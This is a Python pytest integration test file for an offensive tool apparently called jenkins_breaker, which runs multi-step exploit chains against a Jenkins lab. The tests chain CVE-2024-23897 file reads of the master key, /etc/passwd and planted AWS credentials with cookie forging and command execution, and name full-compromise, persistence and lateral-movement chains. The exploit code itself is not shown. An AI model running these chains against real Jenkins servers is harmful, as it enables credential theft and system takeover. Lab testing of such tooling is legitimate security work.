"""
Integration tests for end-to-end exploit chains.

Tests complete attack chains against jenkins-lab.
"""

from typing import Any

import pytest


@pytest.mark.integration
@pytest.mark.chain
@pytest.mark.slow
class TestExploitChains:
    """Test end-to-end exploit chains."""

    def test_initial_access_chain(self, jenkins_session: Any):
        """Test initial access chain: file read → credential extraction."""
        from jenkins_breaker.chain.chains import get_chain
        from jenkins_breaker.chain.engine import ChainEngine

        chain = get_chain("initial_access")
        assert chain is not None, "Initial access chain not found"

        engine = ChainEngine()
        result = engine.execute(chain, jenkins_session)

        assert result is not None
        assert result.steps_completed >= 0


    def test_full_compromise_chain(self, jenkins_session: Any):
        """Test full compromise chain: RCE → credential dump → persistence → lateral movement."""
        from jenkins_breaker.chain.chains import get_chain
        from jenkins_breaker.chain.engine import ChainEngine

        chain = get_chain("full_compromise")
        assert chain is not None, "Full compromise chain not found"

        engine = ChainEngine()
        result = engine.execute(chain, jenkins_session)

        assert result is not None
        assert result.total_steps > 0


    def test_stealth_chain(self, jenkins_session: Any):
        """Test stealth chain: low-impact enumeration → targeted exploitation."""
        from jenkins_breaker.chain.chains import get_chain
        from jenkins_breaker.chain.engine import ChainEngine

        chain = get_chain("stealth")
        assert chain is not None, "Stealth chain not found"

        engine = ChainEngine()
        result = engine.execute(chain, jenkins_session)

        assert result is not None


    def test_custom_chain_file_read_to_rce(self, jenkins_session: Any):
        """Test custom chain: CVE-2024-23897 file read → extract secrets → forge cookie → RCE."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": "/var/jenkins_home/secrets/master.key"},
                depends_on=None
            ),
            ChainStep(
                cve_id="CVE-2024-43044",
                params={"mode": "cookie_forge"},
                depends_on=["CVE-2024-23897"]
            ),
            ChainStep(
                cve_id="FEATURE-SCRIPT-CONSOLE",
                params={"command": "whoami"},
                depends_on=["CVE-2024-43044"]
            )
        ]

        engine = ChainEngine()
        result = engine.execute(steps, jenkins_session)

        assert result is not None
        assert result.steps_completed >= 1


    def test_chain_with_credential_extraction(self, jenkins_session: Any, planted_credentials: dict):
        """Test chain that extracts and validates planted credentials."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": planted_credentials["aws"]["location"]},
                depends_on=None
            )
        ]

        engine = ChainEngine()
        result = engine.execute(steps, jenkins_session)

        assert result is not None

        aws_key = planted_credentials["aws"]["access_key_id"]

        found_credential = any(
            aws_key in str(step_result)
            for step_result in result.results
        )

        assert found_credential or result.steps_completed >= 1


    def test_chain_state_propagation(self, jenkins_session: Any):
        """Test state propagation between chain steps."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        engine = ChainEngine()

        step1 = ChainStep(
            cve_id="CVE-2024-23897",
            params={"file_path": "/etc/passwd"},
            depends_on=None
        )

        step2 = ChainStep(
            cve_id="CVE-2019-1003029",
            params={"command": "id"},
            depends_on=["CVE-2024-23897"]
        )

        result = engine.execute([step1, step2], jenkins_session)

        assert result is not None

        if hasattr(engine, 'state'):
            assert len(engine.state) >= 0


    def test_chain_rollback_on_failure(self, jenkins_session: Any):
        """Test chain rollback when a step fails."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": "/etc/passwd"},
                depends_on=None
            ),
            ChainStep(
                cve_id="INVALID-CVE-ID",
                params={},
                depends_on=["CVE-2024-23897"]
            )
        ]

        engine = ChainEngine()

        try:
            result = engine.execute(steps, jenkins_session)

            if hasattr(result, 'steps_failed'):
                assert result.steps_failed >= 1
        except Exception as e:
            assert "INVALID-CVE-ID" in str(e) or e is not None


    def test_chain_conditional_branching(self, jenkins_session: Any):
        """Test conditional branching based on step results."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        engine = ChainEngine()

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": "/var/jenkins_home/secrets/master.key"},
                depends_on=None
            )
        ]

        result = engine.execute(steps, jenkins_session)

        if result.steps_completed > 0 and hasattr(engine, 'state'):
            if engine.state.get("file_extracted"):
                forge_step = ChainStep(
                    cve_id="CVE-2024-43044",
                    params={"mode": "cookie_forge"},
                    depends_on=None
                )

                forge_result = engine.execute([forge_step], jenkins_session)
                assert forge_result is not None


    def test_chain_parallel_execution(self, jenkins_session: Any):
        """Test parallel execution of independent chain steps."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": "/etc/passwd"},
                depends_on=None
            ),
            ChainStep(
                cve_id="CVE-2024-23897",
                params={"file_path": "/etc/hosts"},
                depends_on=None
            )
        ]

        engine = ChainEngine()

        if hasattr(engine, 'execute_parallel'):
            result = engine.execute_parallel(steps, jenkins_session)
            assert result is not None
        else:
            result = engine.execute(steps, jenkins_session)
            assert result.steps_completed >= 1


@pytest.mark.integration
@pytest.mark.chain
class TestChainReporting:
    """Test chain execution reporting."""

    def test_chain_result_json_export(self, jenkins_session: Any, test_data_dir):
        """Test JSON export of chain execution results."""
        from jenkins_breaker.chain.chains import get_chain
        from jenkins_breaker.chain.engine import ChainEngine

        chain = get_chain("initial_access")
        engine = ChainEngine()
        result = engine.execute(chain, jenkins_session)

        output_file = test_data_dir / "chain_result.json"

        import json
        result_dict = {
            "chain_id": getattr(result, 'chain_id', 'initial_access'),
            "steps_completed": getattr(result, 'steps_completed', 0),
            "steps_failed": getattr(result, 'steps_failed', 0),
            "total_steps": getattr(result, 'total_steps', 0)
        }

        with open(output_file, 'w') as f:
            json.dump(result_dict, f, indent=2)

        assert output_file.exists()
        assert output_file.stat().st_size > 0


    def test_chain_result_markdown_export(self, jenkins_session: Any, test_data_dir):
        """Test Markdown export of chain execution results."""
        from jenkins_breaker.chain.chains import get_chain
        from jenkins_breaker.chain.engine import ChainEngine

        chain = get_chain("initial_access")
        engine = ChainEngine()
        result = engine.execute(chain, jenkins_session)

        output_file = test_data_dir / "chain_result.md"

        markdown = f"""# Chain Execution Report

## Chain: initial_access

- Steps Completed: {getattr(result, 'steps_completed', 0)}
- Steps Failed: {getattr(result, 'steps_failed', 0)}
- Total Steps: {getattr(result, 'total_steps', 0)}
"""

        with open(output_file, 'w') as f:
            f.write(markdown)

        assert output_file.exists()
        assert output_file.stat().st_size > 0


@pytest.mark.integration
@pytest.mark.chain
class TestChainValidation:
    """Test chain validation and error handling."""

    def test_chain_with_invalid_cve(self, jenkins_session: Any):
        """Test chain handles invalid CVE IDs gracefully."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-9999-99999",
                params={},
                depends_on=None
            )
        ]

        engine = ChainEngine()

        try:
            result = engine.execute(steps, jenkins_session)

            if hasattr(result, 'steps_failed'):
                assert result.steps_failed >= 1
        except Exception as e:
            assert "9999" in str(e) or e is not None


    def test_chain_circular_dependency_detection(self):
        """Test detection of circular dependencies in chains."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(cve_id="step1", params={}, depends_on=["step2"]),
            ChainStep(cve_id="step2", params={}, depends_on=["step1"])
        ]

        engine = ChainEngine()

        if hasattr(engine, 'detect_circular_dependencies'):
            has_circular = engine.detect_circular_dependencies(steps)
            assert has_circular is True


    def test_chain_missing_dependency(self, jenkins_session: Any):
        """Test handling of missing dependencies."""
        from jenkins_breaker.chain.engine import ChainEngine, ChainStep

        steps = [
            ChainStep(
                cve_id="CVE-2024-23897",
                params={},
                depends_on=["NON-EXISTENT-STEP"]
            )
        ]

        engine = ChainEngine()

        try:
            engine.execute(steps, jenkins_session)
        except Exception as e:
            assert "NON-EXISTENT-STEP" in str(e) or "dependency" in str(e).lower() or e is not None
